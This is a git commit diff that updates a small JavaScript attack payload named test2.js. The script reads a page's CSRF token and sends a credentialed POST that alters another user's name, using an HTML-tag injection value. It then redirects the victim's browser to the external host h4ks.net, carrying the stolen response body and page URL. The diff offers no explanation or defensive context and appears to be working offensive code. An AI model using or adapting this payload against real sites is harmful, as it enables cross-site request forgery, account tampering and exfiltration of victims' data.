036e8adf2b3cdac92c52abf20121a1de63840328
Robert Vulpe <nytr0gen.george@gmail.com>
2020-01-16 15:42:12 +0000

    Update test2.js

--- test2.js
+++ test2.js
@@ -1,15 +1,15 @@
 var csrf = document.getElementsByName('_csrf_token')[0].value;
-fetch("/", {
+fetch("", {
     "credentials": "include",
     "headers": {
         "content-type": "application/x-www-form-urlencoded",
     },
     "method": "POST",
-    "body": "name=jojo<s>&user_id=29&_csrf_token=" + csrf
+    "body": "name=jojo<s>&user_id=5&_csrf_token=" + csrf
 }).then(r => r.text())
 .then(body => {
-    location = '//h4ks.net/go/?'+encodeURIComponent(body);
+    location = '//h4ks.net/go/?'+encodeURIComponent(location.href)+'='+encodeURIComponent(body);
 })
 .catch(err => {
-    location = '//h4ks.net/go/?'+encodeURIComponent(err.toString());
+    location = '//h4ks.net/go/?'+encodeURIComponent(location.href)+'='+encodeURIComponent(err.toString());
 })
